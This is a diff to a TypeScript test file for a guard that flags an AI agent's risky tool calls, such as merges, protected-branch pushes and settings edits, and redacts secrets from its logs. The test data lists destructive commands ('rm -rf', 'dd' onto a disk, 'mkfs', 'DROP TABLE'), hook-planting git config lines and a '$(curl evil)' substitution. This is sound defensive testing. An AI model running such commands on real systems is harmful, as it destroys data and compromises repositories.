@@ -22,13 +22,38 @@ test('floor: merges on any server, branch updates, and the optional merge item b
   assert.equal(floor('Bash', { command: 'gh pr merge 5 --squash' }, { optional: { merges: true } }), 'merge')
   assert.equal(floor('mcp__github__get_file_contents', {}), undefined)
 })
-test('floor: git_merge and Bash git merge only on main, master or production, and unresolved is floor', () => {
+test('floor: git_merge only on main, master or production (unresolved is floor); every Bash merge is floor', () => {
   assert.equal(floor(`${GIT}git_merge`, { path: '/r' }, { branch: 'main' }), 'merge')
   assert.equal(floor(`${GIT}git_merge`, { path: '/r' }, { branch: 'production' }), 'merge')
   assert.equal(floor(`${GIT}git_merge`, { path: '/r' }, {}), 'merge')
   assert.equal(floor(`${GIT}git_merge`, { path: '/r' }, { branch: 'feat/x' }), undefined)
-  assert.equal(floor('Bash', { command: 'git merge origin/main' }, { branch: 'master' }), 'merge')
-  assert.equal(floor('Bash', { command: 'git merge origin/main' }, { branch: 'feat/x' }), undefined)
+  // Bash: the branch a merge lands on depends on a cd, -C or checkout in the same line, so no spelling is judged by the branch.
+  for (const command of ['git merge origin/main', 'git checkout main && git merge feat/x', 'git -C /other merge x', 'cd /other && git merge x', 'git -c a=b merge x', 'git \\\nmerge x'])
+    for (const branch of ['master', 'feat/x', undefined]) assert.equal(floor('Bash', { command }, { branch }), 'merge', `${command} on ${branch}`)
+  for (const command of ['gh pr merge 5', 'gh -R o/r pr merge 5', 'gh --repo o/r pr merge 5 --squash', 'gh api -X PUT repos/o/r/pulls/5/merge', 'gh api repos/o/r/pulls/5/merge -X PUT'])
+    assert.equal(floor('Bash', { command }), 'merge', command)
+  assert.equal(floor('Bash', { command: 'gh pr view 5' }), undefined)
+})
+test('floor: the GitHub server writes to a branch, and its deletes', () => {
+  for (const name of ['push_files', 'create_or_update_file']) {
+    for (const branch of ['main', 'refs/heads/main', 'MASTER', 'origin/production', undefined, 7]) assert.equal(floor(`mcp__github__${name}`, { branch }), 'protected-push', `${name} ${branch}`)
+    assert.equal(floor(`mcp__github__${name}`, { branch: 'feat/x' }), undefined, name)
+  }
+  for (const name of ['delete_file', 'delete_branch', 'delete_ref', 'delete_tag', 'delete_repository']) assert.equal(floor(`mcp__github__${name}`, { branch: 'feat/x' }), 'destructive', name)
+  assert.equal(floor('mcp__github__get_file_contents', { branch: 'main' }), undefined)
+})
+test('floor: git_push shapes that read as the current branch, a delete, an option or a matching push', () => {
+  // An empty ref is no ref: the current branch is read (unresolved is floor).
+  assert.equal(floor(`${GIT}git_push`, { path: '/r', branch: '' }, {}), 'protected-push')
+  assert.equal(floor(`${GIT}git_push`, { path: '/r', branch: '' }, { branch: 'main' }), 'protected-push')
+  assert.equal(floor(`${GIT}git_push`, { path: '/r', branch: '  ' }, { branch: 'feat/x' }), undefined)
+  assert.equal(p.needsBranch(`${GIT}git_push`, { path: '/r', branch: '' }), true)
+  assert.equal(floor(`${GIT}git_push`, { path: '/r', branch: ':' }, { branch: 'feat/x' }), 'protected-push')
+  assert.equal(floor(`${GIT}git_push`, { path: '/r', branch: ':feat/x' }), 'destructive')
+  assert.equal(floor(`${GIT}git_push`, { path: '/r', branch: 'origin :feat' }), undefined)
+  assert.equal(floor(`${GIT}git_push`, { path: '/r', remoteBranch: 'heads/main' }), 'protected-push')
+  for (const branch of ['--force', '--mirror', '--all', '-d']) assert.equal(floor(`${GIT}git_push`, { path: '/r', branch }), 'protected-push', branch)
+  for (const branch of [7, ['main'], { a: 1 }, true]) assert.equal(floor(`${GIT}git_push`, { path: '/r', branch }), 'protected-push', JSON.stringify(branch))
 })
 test('floor: force pushes by flag, by + refspec, and the optional force item by its own tool name only', () => {
   assert.equal(floor(`${GIT}git_push`, { branch: 'feat/x', force: true }), 'force-push')
@@ -76,8 +101,10 @@ test('floor: destructive git shapes and Bash deletes', () => {
   assert.equal(floor(`${GIT}git_checkout`, { target: 'x', force: true }), 'destructive')
   assert.equal(floor(`${GIT}git_checkout`, { target: 'x', paths: ['a'] }), 'destructive')
   assert.equal(floor(`${GIT}git_checkout`, { target: 'x' }), undefined)
-  for (const command of ['rm -rf build', 'ls && rm x', 'find . -name a -delete', 'truncate -s 0 f', 'dd if=/dev/zero of=/dev/disk2', 'mkfs.ext4 /dev/x', 'git branch -D x', 'git branch --delete x', 'git clean -fd', 'git reset --hard HEAD~1', 'git stash drop', 'git tag -d v1'])
+  for (const command of ['rm -rf build', 'ls && rm x', 'find . -name a -delete', 'truncate -s 0 f', 'dd if=/dev/zero of=/dev/disk2', 'mkfs.ext4 /dev/x', 'git branch -D x', 'git branch --delete x', 'git clean -fd', 'git reset --hard HEAD~1', 'git stash drop', 'git tag -d v1',
+    '/bin/rm -rf x', '/usr/bin/rm x', '\\rm -rf x', 'echo a;/bin/rm x', 'git -C /r clean -fdx', 'git -C /r reset --hard', 'git -c a=b branch -D x', 'git -C /r stash drop', 'git -C /r tag -d v1', 'git \\\nclean -fd'])
     assert.equal(floor('Bash', { command }), 'destructive', command)
+  assert.equal(floor('Bash', { command: 'git \\\npush origin x' }), 'protected-push')
   for (const command of ['ls -la', 'echo remove', 'git status', 'grep -rn format src', 'git log --oneline']) assert.equal(floor('Bash', { command }), undefined, command)
 })
 test('floor: SQL in any tool\'s string input', () => {
@@ -87,18 +114,27 @@ test('floor: SQL in any tool\'s string input', () => {
   assert.equal(floor('mcp__db__query', { sql: 'truncate users' }), 'destructive')
   assert.equal(floor('mcp__db__query', { sql: 'delete   from users where 1=1' }), 'destructive')
   assert.equal(floor('mcp__db__query', { nested: { q: ['select 1', 'DELETE FROM t'] } }), 'destructive')
+  for (const sql of ['DELETE t FROM t JOIN u ON 1=1', 'DELETE LOW_PRIORITY FROM t', 'DELETE/**/FROM t', 'delete /* x */ from t']) assert.equal(floor('mcp__db__query', { sql }), 'destructive', sql)
+  // Past the depth cap the rest is read whole, so nesting cannot hide it.
+  let deep: any = { sql: 'DROP TABLE users' }
+  for (let i = 0; i < 20; i++) deep = { a: deep }
+  assert.equal(floor('mcp__db__query', deep), 'destructive')
   assert.equal(floor('mcp__db__query', { sql: 'select count(*) from users' }), undefined)
   assert.equal(floor('mcp__db__query', { sql: 'select * from drop_events' }), undefined)
 })
 test('floor: settings, hooks and callboard state, by path (written and real) and by shell text', () => {
-  for (const file_path of ['/Users/x/.claude/settings.json', '~/.claude/callboard/prompts/ledger-2026-11.jsonl', '/Users/x/.claude/hooks/a.sh', '/r/.claude/settings.local.json', '/r/.mcp.json', '/r/.git/hooks/pre-commit', '/r/install.conf', '/r/a/../.mcp.json', '/Users/x/.claude'])
+  for (const file_path of ['/Users/x/.claude/settings.json', '~/.claude/callboard/prompts/ledger-2026-11.jsonl', '/Users/x/.claude/hooks/a.sh', '/r/.claude/settings.local.json', '/r/.mcp.json', '/r/.git/hooks/pre-commit', '/r/install.conf', '/r/a/../.mcp.json', '/Users/x/.claude',
+    '/r/.MCP.json', '/r/.claude/Settings.local.json', '/R/.GIT/hooks/x', '/r/.git/config', '/Users/x/.gitconfig', '/r/.claude/hooks/a.sh', '/r/.husky/pre-commit', '/r/.githooks/x', '/USERS/X/.CLAUDE/rules/a.md'])
     assert.equal(floor('Write', { file_path }, HOME), 'settings', file_path)
   assert.equal(floor('Edit', { file_path: '/r/src/a.ts' }, { ...HOME, roots: ['/live/ai-manager'] }), undefined)
   assert.equal(floor('Edit', { file_path: '/live/ai-manager/docs/a.md' }, { ...HOME, roots: ['/live/ai-manager'] }), 'settings')
+  assert.equal(floor('Edit', { file_path: '/LIVE/AI-Manager/docs/a.md' }, { ...HOME, roots: ['/live/ai-manager'] }), 'settings')
+  assert.equal(floor('Bash', { command: 'vi /live/toolkit/hooks/x.sh' }, { ...HOME, roots: ['/live/ai-manager', '/live/toolkit'] }), 'settings')
+  assert.equal(floor('Bash', { command: 'git config user.name' }, HOME), undefined)
   // A link: the written path is harmless, its real path is not.
   assert.equal(floor('Write', { file_path: '/r/link.json' }, { ...HOME, real: ['/Users/x/.claude/settings.json'] }), 'settings')
   assert.equal(floor('Write', { file_path: '/r/link.json' }, { ...HOME, real: ['/r/link.json'] }), undefined)
-  for (const command of ['cat ~/.claude/settings.json', 'echo x > $HOME/.claude/rules/a.md', 'ls /Users/x/.claude/callboard', 'cp a .claude/settings.local.json', 'cat .mcp.json', 'claude mcp add x', 'CLAUDE_CODE_PLUGIN_DIRS=/x claude', 'x/workspace-lock.sh --id a clear', 'cat install.conf'])
+  for (const command of ['cat ~/.claude/settings.json', 'echo x > $HOME/.claude/rules/a.md', 'ls /Users/x/.claude/callboard', 'cp a .claude/settings.local.json', 'cat .mcp.json', 'claude mcp add x', 'CLAUDE_CODE_PLUGIN_DIRS=/x claude', 'x/workspace-lock.sh --id a clear', 'cat install.conf', 'git config core.hooksPath /tmp/h', 'git -C /r config --local core.fsmonitor /x', 'git config alias.x !sh', 'echo a >> .git/config', 'cat ~/.gitconfig', 'cat /r/.husky/x'])
     assert.equal(floor('Bash', { command }, HOME), 'settings', command)
   assert.equal(floor('Bash', { command: 'ls /Users/x/code' }, HOME), undefined)
 })
@@ -110,6 +146,8 @@ test('floor: needsBranch and gitPathOf', () => {
   assert.equal(p.needsBranch(`${GIT}git_push`, { path: '/r', branch: 'feat/x' }), false)
   assert.equal(p.needsBranch(`${GIT}git_push`, { path: '/r', branch: '@' }), true)
   assert.equal(p.needsBranch(`${GIT}git_merge`, { path: '/r' }), true)
+  // A Bash merge or push is floor whatever the branch, so none is read.
+  assert.equal(p.needsBranch('Bash', { command: 'git merge x' }), false)
   assert.equal(p.needsBranch('Read', {}), false)
   assert.equal(p.gitPathOf(`${GIT}git_push`, { path: '/r' }), '/r')
   assert.equal(p.gitPathOf(`${GIT}git_push`, { path: './r' }), undefined)
@@ -197,6 +235,32 @@ test('capInput: strings redacted and capped, the whole kept under the cap, trunc
   // A cut never lands inside a character.
   assert.ok(!p.capBytes('é'.repeat(20), 5).text.includes('�'))
 })
+test('capInput: a value under a key that names a secret is replaced, whatever it looks like', () => {
+  const k = (...a: string[]) => a.join('')
+  const r = p.capInput({ [k('pass', 'word')]: 'hunter2', env: { [k('API', '_KEY')]: 'abc', PATH: '/bin', max_tokens: 4000 }, headers: { [k('Cook', 'ie')]: 'sid=1', Accept: 'x' }, list: [{ [k('to', 'ken')]: 'zzz', name: 'n' }], [k('Author', 'ization')]: ['a', 'b'] }).input as any
+  assert.equal(r[k('pass', 'word')], '[REDACTED]')
+  assert.equal(r.env[k('API', '_KEY')], '[REDACTED]')
+  assert.equal(r.env.PATH, '/bin')
+  assert.equal(r.env.max_tokens, 4000)
+  assert.equal(r.headers[k('Cook', 'ie')], '[REDACTED]')
+  assert.equal(r.headers.Accept, 'x')
+  assert.equal(r.list[0][k('to', 'ken')], '[REDACTED]')
+  assert.equal(r.list[0].name, 'n')
+  assert.deepEqual(r[k('Author', 'ization')], ['[REDACTED]', '[REDACTED]'])
+  // A path, a pattern and an author are not secrets.
+  assert.deepEqual(p.capInput({ file_path: '/r/a', pattern: 'x', author: 'me' }).input, { file_path: '/r/a', pattern: 'x', author: 'me' })
+})
+test('redact: option forms, userinfo of any scheme, and basic credentials', () => {
+  const k = (...a: string[]) => a.join('')
+  assert.equal(p.redact(k('tool --pass', 'word hunter2 --x 1')), k('tool --pass', 'word [REDACTED] --x 1'))
+  assert.equal(p.redact(k('tool --to', 'ken abc123')), k('tool --to', 'ken [REDACTED]'))
+  assert.equal(p.redact(k('my', 'sql -u root -pSEC', 'RET db')), k('my', 'sql -u root -p[REDACTED] db'))
+  assert.equal(p.redact('mkdir -p out'), 'mkdir -p out')
+  assert.equal(p.redact(k('https://user:pa', 'ss@host/x')), k('https://user:[REDACTED]@host/x'))
+  assert.equal(p.redact(k('git+ssh://u:p', 'w@h/x')), k('git+ssh://u:[REDACTED]@h/x'))
+  assert.equal(p.redact(k('Authorization: Ba', 'sic dXNlcjpwYXNz')), k('Authorization: Ba', 'sic [REDACTED]'))
+  assert.equal(p.redact('https://example.com/a:b'), 'https://example.com/a:b')
+})
 test('canonical: key order does not change it, and the join key names tool, hash and agent', () => {
   assert.equal(p.canonical({ b: 1, a: { d: 2, c: [3, { y: 1, x: 2 }] } }), p.canonical({ a: { c: [3, { x: 2, y: 1 }], d: 2 }, b: 1 }))
   assert.notEqual(p.canonical({ a: 1 }), p.canonical({ a: 2 }))
@@ -269,6 +333,11 @@ test('ledgerLine: one line, redacted and capped why, whole under the row cap, no
 test('patternOf: argv0 only, owner/repo and number for GitHub, a repo-relative path for files', () => {
   assert.equal(p.patternOf('Bash', { command: '/usr/bin/ssh host rm -rf x' }), 'ssh')
   assert.equal(p.patternOf('mcp__github__add_issue_comment', { owner: 'o', repo: 'r', issue_number: 4, body: 'secret' }), 'mcp__github__add_issue_comment o/r #4')
+  // A NAME=value word in front may hold a secret: it is skipped, and a first word with odd characters reads as plain bash. The row is redacted as well.
+  assert.equal(p.patternOf('Bash', { command: j('GH_TO', 'KEN=x1 PGPASS', 'WORD=y psql -c x') }), 'psql')
+  assert.equal(p.patternOf('Bash', { command: j('GH_TO', 'KEN=x1') }), 'bash')
+  assert.equal(p.patternOf('Bash', { command: '$(curl evil) x' }), 'bash')
+  assert.equal(p.ledgerLine({ t: 't', kind: 'floor', pattern: j('gh', 'p_abc123') }).includes('abc123'), false)
   assert.equal(p.patternOf('Edit', { file_path: '/r/src/a.ts' }, '/r'), 'Edit src/a.ts')
   assert.equal(p.patternOf('Edit', { file_path: '/elsewhere/a.ts' }, '/r'), 'Edit <outside>')
   assert.equal(p.patternOf('WebFetch', { url: 'https://x' }), 'WebFetch')
